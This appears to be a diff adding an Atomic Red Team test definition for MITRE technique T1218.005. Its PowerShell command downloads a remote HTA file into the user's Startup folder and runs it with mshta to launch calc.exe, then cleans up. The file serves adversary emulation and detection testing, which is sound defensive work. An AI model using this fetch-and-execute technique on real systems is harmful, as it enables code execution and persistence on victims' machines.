@@ -1,0 +1,58 @@
+{
+  "id": "c4b97eeb-5249-4455-a607-59f95485cb45",
+  "name": "Mshta Executes Remote HTML Application (HTA)",
+  "description": "Execute an arbitrary remote HTA. Upon execution calc.exe will be launched.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "5cfed767-119b-4e14-a0e9-2a9094f271fe",
+      "type": "execute-command",
+      "data": {
+        "command": "$var =Invoke-WebRequest \"#{hta_url}\"\n$var.content|out-file \"#{temp_file}\"\nmshta \"#{temp_file}\"\nstart-sleep -s 15\nstop-process -name \"calculator\" -Force\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "417e3b85-a41f-4b95-a3b4-f0fe882eb739",
+      "type": "execute-command",
+      "data": {
+        "command": "remove-item \"#{temp_file}\" -ErrorAction Ignore\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "5cfed767-119b-4e14-a0e9-2a9094f271fe",
+      "p": "on-success",
+      "o": "417e3b85-a41f-4b95-a3b4-f0fe882eb739"
+    },
+    {
+      "s": "5cfed767-119b-4e14-a0e9-2a9094f271fe",
+      "p": "on-failure",
+      "o": "417e3b85-a41f-4b95-a3b4-f0fe882eb739"
+    }
+  ],
+  "tags": [
+    "T1218.005",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "temp_file",
+      "type": "string",
+      "description": "temp_file location for hta",
+      "value": "$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta"
+    },
+    {
+      "name": "hta_url",
+      "type": "string",
+      "description": "URL to HTA file for execution",
+      "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta"
+    }
+  ]
+}
